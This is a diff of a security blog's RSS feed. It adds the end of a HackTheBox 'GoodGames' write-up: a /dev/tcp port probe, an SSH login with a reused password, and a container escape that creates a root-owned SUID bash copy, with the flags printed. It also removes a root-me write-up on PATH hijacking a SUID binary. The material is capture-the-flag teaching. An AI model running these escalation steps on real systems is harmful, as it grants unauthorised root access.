+&lt;p&gt;This output reveals an overlay filesystem mounted at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, which is typical for Docker containers. It also shows &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/sda1&lt;/code&gt; mounted at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/augustus&lt;/code&gt;, indicating a bind mount or a volume. This specific mount point suggests 
+a directory from the host system (/home/augustus) is being mapped into the container, a common practice in Docker for data persistence or sharing between the host and the container.&lt;/p&gt;
+
+&lt;p&gt;One thing that it is important to note is that in a Docker environment, each container is typically assigned an IP address from a subnet managed by Docker. The default behavior is for Docker to create a bridge network and assign IP addresses to each container connected to this network. The first IP in the subnet, often ending in .1, is usually assigned to the gateway of the Docker bridge network, which facilitates communication between the containers and the host machine.&lt;/p&gt;
+
+&lt;p&gt;Since our container’s IP ends with .2, then it is highly likely that the .1 address is the one that links the container to the
+host machine. We can check if SSH port on this gateway is open by using this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;3 bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cat &amp;lt; /dev/null &amp;gt; /dev/tcp/172.19.0.1/22&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If no error messages are shown, then it is probable that the port is open and we can try to SSH into the machine. From our enumeration, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;augustus&lt;/code&gt; is a user. Based on the problem description, we see that it mentions password reuse. If
+that is the case, then the SSH credentials might be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;augustus:superadministrator&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
+ssh augustus@172.19.0.1
+augustus@172.19.0.1 password: superadministrator
+
+Linux GoodGames 4.19.0-18-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64&lt;/span&gt;
+
+The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
+individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Jan 13 16:19:33 2024 from 172.19.0.2
+augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we are out of the container! However, we are not root now. How could we get root having access to a privileged container and
+to a less privileged user in the host machine?&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
+
+&lt;p&gt;The initial step to consider is verifying whether file transfers from the privileged container to the ‘augustus’ user are feasible. Given that /dev/sda1 is mounted at /home/augustus, a practical approach would be to copy a file into this directory from within the host. Subsequently, we can check if the file appears on the container to confirm the transfer’s success.&lt;/p&gt;
+
+&lt;p&gt;Inside the host with ‘augustus’ user, we run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;test-file
+&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;test-file
+augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 24
+drwxr-xr-x 2 augustus augustus 4096 Jan 13 16:45 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 3 root     root     4096 Oct 19  2021 ..
+lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -&amp;gt; /dev/null
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 augustus augustus  220 Oct 19  2021 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 augustus augustus 3526 Oct 19  2021 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 augustus augustus  807 Oct 19  2021 .profile
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 augustus augustus    0 Jan 13 16:45 test-file
+&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt; 1 root     augustus   33 Jan 12 23:04 user.txt   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, we go back to the container and see if the file is present:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/home/augustus# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; test-file
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; test-file
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 1000 1000 0 Jan 13 16:45 test-file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Success! As we can access files created by ‘augustus’, we have the potential to gain root access. This can be achieved by copying the /bin/bash binary to /home/augustus inside the host machine, setting its SUID bit and onwership to root in the container, and then executing it in the ‘augustus’ user. This method is likely to grant us root access on the host machine.&lt;/p&gt;
+
+&lt;h2 id=&quot;solving&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt;Solving!&lt;/h2&gt;
+
+&lt;p&gt;Let’s try it out! First, we run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/bash ./badbash
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/bash ./badbash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/home/augustus# &lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root:root badbash
+&lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root:root badbash
+root@3a453ab39d3d:/home/augustus# &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4777 badbash
+&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4777 badbash
+root@3a453ab39d3d:/home/augustus# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; badbash
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; badbash
+&lt;span class=&quot;nt&quot;&gt;-rwsrwxrwx&lt;/span&gt; 1 root root 1168776 Jan 13 16:48 badbash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, back on the host machine:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; badbash
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; badbash
+&lt;span class=&quot;nt&quot;&gt;-rwsrwxrwx&lt;/span&gt; 1 root root 1168776 Jan 13 16:48 badbash
+augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./badbash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+./badbash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+badbash-5.0# &lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we get root on the host machine! We can now retrieve the flags:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;badbash-5.0# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User flag:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/augustus/user.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Root flag:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+&amp;lt;ustus/user.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Root flag:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+User flag:
+c48d858e747788869b014967d28dd872
+Root flag:
+bdb613146b47f0a8c563b9fda49567ea
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;This CTF had nice concepts to practice: ranging from SQL injection, to Server Side Template Injection and then 
+Docker escape with a privileged container and less privileged host access.&lt;/p&gt;
+
+&lt;p&gt;With the SQL injection, we got the administrator
+user on the website. We managed to successfully exploit the Server Side Template Injection (SSTI) vulnerability and gain access to the system’s container. Due to implementation faults, we were able to escalate our privileges by escaping the Docker environment and using both the container and a less privileged user on the host to gain root access. This allowed us to have full control over the system.&lt;/p&gt;
+
+&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 10 Jan 2024 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000//goodgames-htb</link>
+        <link href="http://localhost:4000/goodgames-htb"/>
+        <guid isPermaLink="true">http://localhost:4000/goodgames-htb</guid>
+      </item>
     
       <item>
         <title>flag - pwnable.kr</title>
@@ -2158,194 +2516,6 @@ SecureIEXpassword
         <link>http://localhost:4000//powershell-command-injection-root-me</link>
         <link href="http://localhost:4000/powershell-command-injection-root-me"/>
         <guid isPermaLink="true">http://localhost:4000/powershell-command-injection-root-me</guid>
-      </item>
-    
-      <item>
-        <title>Bash - System 2 - root-me.org</title>
-        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;Since we just solved Bash - System 1 (you can check it out &lt;a href=&quot;bash-system-1-root-me&quot;&gt;here&lt;/a&gt;), let’s go and solve their second level as well. This challenge is very similar to the last one, but with a twist.&lt;/p&gt;
-
-&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
-
-&lt;p&gt;The ‘Statement’ for this challenge is the following C code:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
-&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
-&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
-&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
-&lt;/span&gt;     
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;setreuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls -lA /challenge/app-script/ch12/.passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;To connect to the room, we can SSH:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2222 app-script-ch12@challenge02.root-me.org&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;with the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch12&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
-
-&lt;p&gt;Let’s start building up some calluses again by developing our approach mindset step-by-step. For this problem, we have already tackled the basic concepts in our previous Capture The Flag (CTF) challenge.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
-
-&lt;p&gt;If you are not familiar with the functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setreuid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;, go check it out in my last CTF solution for Bash - System 1, which we discussed them thoroughly &lt;a href=&quot;bash-system-1-root-me#step-1---understanding-basic-concepts&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;
-
-&lt;p&gt;We can see that this challenge is fairly similar to Bash - System 1 challenge. However, we have something new here. In the previous CTF, we saw that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; line was simply a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. In this level, the complexity increases with the addition of a switch to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, as seen in the following line of code:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;ls -lA /challenge/app-script/ch12/.passwd&quot;);&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Note that we have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; switch passed as argument to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. Let’s SSH into the machine and take a look around:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 32
-dr-xr-x---  2 app-script-ch12-cracked app-script-ch12         4096 Dec 10  2021 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 25 root                    root                    4096 Sep  5 14:00 ..
-&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 root                    root                     640 Dec 10  2021 ._perms
-&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt;  1 root                    root                      43 Dec 10  2021 .git
-&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch12-cracked app-script-ch12-cracked   14 Dec 10  2021 .passwd
-&lt;span class=&quot;nt&quot;&gt;-rwsr-x---&lt;/span&gt;  1 app-script-ch12-cracked app-script-ch12         7252 Dec 10  2021 ch12
-&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch12         app-script-ch12          204 Dec 10  2021 ch12.c
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As we can see, we need to find a way to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt; file through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary, which is the compiled version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12.c&lt;/code&gt;. The problem is exactly the same as the previous one in Bash - System 1. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; SUID bit is set, meaning the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; function, alongside with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setreuid&lt;/code&gt;, will make sure the script runs the command as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch12-cracked&lt;/code&gt;, granting the right permissions we need to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;We could think of a way to trick the program into thinking it ran the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, but actully runs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. However, the switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; will make this unbearable. The thing is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command does not have these two switches used here.&lt;/p&gt;
-
-&lt;p&gt;Well, we already know how to make the program runs a crafted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. We just need to find a way to make it ignore the switch. That’s our goal!&lt;/p&gt;
-
-&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
-
-&lt;p&gt;We shall start solving this challenge by doing exactly what we have done in Bash - System 1:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;First, we go to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and make a new directory. Then, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; into it:&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cecil
-app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/cecil
-app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Now, we export this path to our $PATH variable with the following command:&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/cecil:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
-app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
-/tmp/cecil:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This part is already done. The new $PATH variable includes our new path as first, meaning that any script will prioritize it when looking for commands to run. Now it comes the tricky part.&lt;/p&gt;
-
-&lt;p&gt;To make a point, let’s try to solve this (erroneously) with the same approach used in Bash - System 1. We copied the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/cat&lt;/code&gt; binary into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil&lt;/code&gt; with the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. After that, we run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary to read the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/cat &lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; -
-/challenge/app-script/ch12
-app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: invalid option &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;l&apos;&lt;/span&gt;
-Try &lt;span class=&quot;s1&quot;&gt;&apos;ls --help&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As we can see, this does not work, and the reason is exactly because of the switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt;. It would have worked if we did not have these switches.&lt;/p&gt;
-
-&lt;h3 id=&quot;abusing-chmod-command&quot;&gt;Abusing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; command&lt;/h3&gt;
-
-&lt;p&gt;One way I thought to circumvent this is by writing a bash script named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; that contained a command to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;. But to do so, we need access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;. We can test this in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil&lt;/code&gt; directory by creating a bash script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt; and making it an executable with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x test&lt;/code&gt;. For our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt; script, we wrote it with vim:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hi mom&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Followed by:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;test
-&lt;/span&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./test
-hi mom
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As we can see, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; to create bash executable scripts. Since we are inside a directory included in the path variable, we could craft an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; bash script with a cat command inside of it:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and then:&lt;/p&gt;
-
